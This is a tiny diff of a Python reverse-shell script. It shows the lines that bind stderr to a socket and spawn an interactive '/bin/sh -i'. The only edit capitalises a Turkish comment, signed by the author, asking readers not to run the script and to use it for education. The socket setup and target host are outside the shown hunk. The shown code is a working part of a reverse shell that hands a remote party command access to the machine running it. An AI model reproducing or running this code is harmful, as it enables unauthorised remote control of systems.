@@ -7,5 +7,5 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 
 
-# sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
+# Sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
 # by Kamil Umut Araz
